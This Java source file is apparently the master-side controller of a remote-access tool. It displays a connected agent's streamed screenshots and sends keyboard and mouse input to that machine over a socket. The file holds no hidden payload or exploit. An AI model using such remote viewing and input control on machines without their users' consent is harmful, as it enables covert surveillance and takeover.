package org.pandora.master.scene.impl.agent;


import javafx.beans.value.ObservableValue;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.embed.swing.SwingFXUtils;
import javafx.geometry.Insets;
import javafx.scene.Scene;
import javafx.scene.control.CheckBox;
import javafx.scene.control.ChoiceBox;
import javafx.scene.control.Label;
import javafx.scene.image.ImageView;
import javafx.scene.input.KeyCode;
import javafx.scene.layout.AnchorPane;
import javafx.scene.layout.Background;
import javafx.scene.layout.BackgroundFill;
import javafx.scene.layout.CornerRadii;
import javafx.scene.paint.Color;
import javafx.scene.shape.Line;
import javafx.stage.Stage;
import javafx.stage.WindowEvent;
import lombok.Getter;
import org.pandora.master.Master;
import org.pandora.master.builder.BuilderManager;
import org.pandora.master.builder.impl.scene.ControllerBuilder;
import org.pandora.master.data.agent.AgentData;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.Base64;
import java.util.concurrent.atomic.AtomicLong;

public class Desktop {

    private final AnchorPane anchorPane;
    private final BuilderManager builderManager;
    @Getter
    private final AgentData agentData;
    private final Scene scene;
    private final Stage stage;
    private final Master master;
    @Getter
    private final ControllerBuilder controllerBuilder;
    private final ObservableList<String> screenChoiceData;
    private double xOffset, yOffset;
    private final double imgH, imgV;
    private final ImageView image;
    private final Label remoteLabel, screenLabel, resolutionLabel;
    private final CheckBox remoteCheckBox;
    private final ChoiceBox<String> resolutionChoice, screenChoice;
    private Thread keyboardThread, mouseThread;

    public Desktop(final ControllerBuilder controllerBuilder) {
        this.controllerBuilder = controllerBuilder;
        this.master = controllerBuilder.getMaster();
        this.anchorPane = controllerBuilder.getAnchorPane();
        this.builderManager = controllerBuilder.getBuilderManager();
        this.agentData = controllerBuilder.getAgentData();
        this.scene = controllerBuilder.getScene();
        this.stage = controllerBuilder.getStage();
        this.screenChoiceData = FXCollections.observableArrayList();
        this.remoteCheckBox = this.builderManager.getCheckBoxBuilder().buildCheckBox(5, 617);
        this.remoteLabel = this.builderManager.getLabelBuilder().buildLabel("Remote Control", 27, 619, Color.rgb(230, 230, 230), "Consolas", 12);
        this.screenLabel = this.builderManager.getLabelBuilder().buildLabel("Screen", 720, 620, Color.rgb(230, 230, 230), "Consolas", 12);
        this.resolutionLabel = this.builderManager.getLabelBuilder().buildLabel("Resolution", 720, 650, Color.rgb(230, 230, 230), "Consolas", 12);
        this.resolutionChoice = (ChoiceBox<String>) this.builderManager.getChoiceBoxBuilder().buildChoiceBox(FXCollections.observableArrayList("Default", "4:3", "16:9", "16:10"), 810, 646, 70, 6);
        this.screenChoice = (ChoiceBox<String>) this.builderManager.getChoiceBoxBuilder().buildChoiceBox(this.screenChoiceData, 810, 616, 140, 6);
        this.image = new ImageView();
        this.keyboardThread = null;
        this.mouseThread = null;
        this.yOffset = 0;
        this.xOffset = 0;
        this.imgH = 955;
        this.imgV = 580;
    }

    public void open() {
        this.master.getStageManager().getScenes().put(this.controllerBuilder, this);
        this.anchorPane.setBackground(new Background(new BackgroundFill(Color.rgb(26, 27, 36), CornerRadii.EMPTY, Insets.EMPTY)));

        final Label defaultLabel = this.builderManager.getLabelBuilder().buildLabel("Desktop | " + this.agentData.getUser() + "@" + this.agentData.getAddress(), 15, 20, Color.rgb(230, 230, 230), "Consolas", 17);
        final Line line = this.builderManager.getBasicLineBuilder().buildSimpleLine(Color.WHITE, 40, 54, 915, 54);

        this.image.setX(0);
        this.image.setY(25);
        this.image.prefHeight(this.imgV);
        this.image.prefWidth(this.imgH);

        this.resolutionChoice.setValue("Default");

        this.remoteCheckBox.setId("agent-desktop-remoteCheckBox");
        this.resolutionChoice.setId("agent-desktop-resolutionChoice");
        this.screenChoice.setId("agent-desktop-screenChoice");

        this.changeMovable();
        this.sendRequest();

        this.scene.getWindow().addEventFilter(WindowEvent.WINDOW_CLOSE_REQUEST, this::close);
        this.anchorPane.getChildren().addAll(defaultLabel, line, this.image, this.remoteCheckBox, this.remoteLabel, this.screenLabel, this.resolutionLabel, this.resolutionChoice, this.screenChoice);
        this.registerListeners();

        this.screenChoice.getSelectionModel()
                .selectedItemProperty()
                .addListener((ObservableValue<? extends String> observable, String oldValue, String newValue) -> {
                    if (oldValue != null)
                        this.master.getSocketUtils().write(this.agentData.getId(), "desktop:state:stop:" + oldValue.split(" \\(")[0].replace("Screen ", ""));
                    final int screen = Integer.parseInt(newValue.split(" \\(")[0].replace("Screen ", ""));
                    this.master.getSocketUtils().write(this.agentData.getId(), "desktop:state:start:" + screen);
                    this.getControllerBuilder().screen = screen;
                });
    }

    private void registerListeners() {
        final Scene scene = this.scene;
        this.image.setFocusTraversable(true);
        new Thread(() -> {
            this.keyboardThread = Thread.currentThread();
            scene.setOnKeyPressed(event -> {
                if (this.remoteCheckBox.isSelected()) {
                    final KeyCode keyCode = event.getCode();
                    final String keyName = keyCode.getName().toLowerCase();
                    final String value;
                    switch (keyName) {
                        case "esc":
                            value = "27";
                            break;
                        case "space":
                            value = "32";
                            break;
                        default:
                            value = String.valueOf(keyCode.impl_getCode());
                            break;
                    }
                    this.master.getSocketUtils().write(this.agentData.getId(), "desktop:sendKeyboardPressed:" + value + ":" + this.screenChoice.getValue().split(" \\(")[0].replace("Screen ", ""));
                }
            });
            scene.setOnKeyReleased(event -> {
                if (this.remoteCheckBox.isSelected())
                    this.master.getSocketUtils().write(this.agentData.getId(), "desktop:sendKeyboardReleased:" + event.getCode().impl_getCode() + ":" + this.screenChoice.getValue().split(" \\(")[0].replace("Screen ", ""));

            });
        }).start();
        new Thread(() -> {
            this.mouseThread = Thread.currentThread();
            final AtomicLong lastMouse = new AtomicLong(System.currentTimeMillis());
            this.image.setOnMouseMoved(event -> {
                if (this.remoteCheckBox.isSelected() && (System.currentTimeMillis() - lastMouse.get() > 4)) {
                    lastMouse.set(System.currentTimeMillis());
                    final double x = Math.min(event.getX() / this.imgH, 1.0);
                    final double y = Math.min((event.getY() - 25) / this.imgV, 1.0);
                    this.master.getSocketUtils().write(this.agentData.getId(), "desktop:sendMouseMove:" + x + ":" + y + ":" + this.screenChoice.getValue().split(" \\(")[0].replace("Screen ", ""));

                }
            });
            this.image.setOnMousePressed(event -> {
                if (this.remoteCheckBox.isSelected())
                    this.master.getSocketUtils().write(this.agentData.getId(), "desktop:sendMousePressed:" + event.getButton().name() + ":" + this.screenChoice.getValue().split(" \\(")[0].replace("Screen ", ""));

            });
            this.image.setOnMouseReleased(event -> {
                if (this.remoteCheckBox.isSelected())
                    this.master.getSocketUtils().write(this.agentData.getId(), "desktop:sendMouseReleased:" + event.getButton().name() + ":" + this.screenChoice.getValue().split(" \\(")[0].replace("Screen ", ""));
            });
        }).start();
    }

    private void changeMovable() {
        this.scene.setOnMousePressed(event -> {
            final String target = event.getTarget().toString();
            if (!target.contains("ImageView") && !target.contains("image-view")) {
                this.xOffset = this.stage.getX() - event.getScreenX();
                this.yOffset = this.stage.getY() - event.getScreenY();
            }
        });
        this.scene.setOnMouseDragged(event -> {
            final String target = event.getTarget().toString();
            if (!target.contains("ImageView") && !target.contains("image-view")) {
                this.stage.setX(event.getScreenX() + this.xOffset);
                this.stage.setY(event.getScreenY() + this.yOffset);
            }
        });
    }

    private void sendRequest() {
        this.master.getSocketUtils().write(this.agentData.getId(), "desktop:state:start:-1");
    }

    private void close(final WindowEvent event) {
        this.master.getSocketUtils().write(this.agentData.getId(), "desktop:state:stop:" + this.controllerBuilder.screen);
        if (this.keyboardThread != null) this.keyboardThread.interrupt();
        if (this.mouseThread != null) this.mouseThread.interrupt();
    }

    public void receiveRequest(final String agentId, final String mode, final String data) {
        if (!this.agentData.getId().equals(agentId)) return;
        if (mode.equals("start")) {
            this.screenChoiceData.clear();
            final String[] screenSplit = data.split("#");
            for (int i = 0; i < this.count(data); i++) {
                final String[] valueSplit = screenSplit[i].split(";");
                this.screenChoiceData.add("Screen " + valueSplit[0] + " (" + valueSplit[1] + ")");
            }
        } else if (mode.equals("image")) {
            if (this.screenChoice.getValue() != null) {
                String selected = this.screenChoice.getValue();
                if (selected != null && selected.contains("x")) {
                    selected = selected.split(" \\(")[0].replace("Screen ", "");
                    final String screenId = data.split(":")[0];
                    final String screenData = data.split(":")[1];
                    if (screenId.equals(selected)) {
                        try {
                            final byte[] buffer = Base64.getDecoder().decode(screenData);
                            final ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(buffer);
                            final BufferedImage bufferedImage;
                            final String value = this.resolutionChoice.getValue();
                            switch (value) {
                                case "4:3":
                                    bufferedImage = this.resize(ImageIO.read(byteArrayInputStream), 800, 600);
                                    break;
                                case "16:9":
                                    bufferedImage = this.resize(ImageIO.read(byteArrayInputStream), 955, 537);
                                    break;
                                case "16:10":
                                    bufferedImage = this.resize(ImageIO.read(byteArrayInputStream), 955, 597);
                                    break;
                                default:
                                    bufferedImage = this.resize(ImageIO.read(byteArrayInputStream), (int) this.imgH, (int) this.imgV);
                                    break;
                            }
                            //ImageIO.read(byteArrayInputStream);
                            this.image.setImage(SwingFXUtils.toFXImage(bufferedImage, null));
                        } catch (final IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }
    }

    private BufferedImage resize(final BufferedImage img, final int newW, final int newH) {
        final Image tmp = img.getScaledInstance(newW, newH, Image.SCALE_SMOOTH);
        final BufferedImage bufferedImage = new BufferedImage(newW, newH, BufferedImage.TYPE_INT_ARGB);
        final Graphics2D g2d = bufferedImage.createGraphics();
        g2d.drawImage(tmp, 0, 0, null);
        g2d.dispose();
        return bufferedImage;
    }

    private int count(final String string) {
        int count = 0;
        for (int i = 0; i < string.length(); i++) if (string.charAt(i) == '#') count++;
        return count;
    }
}
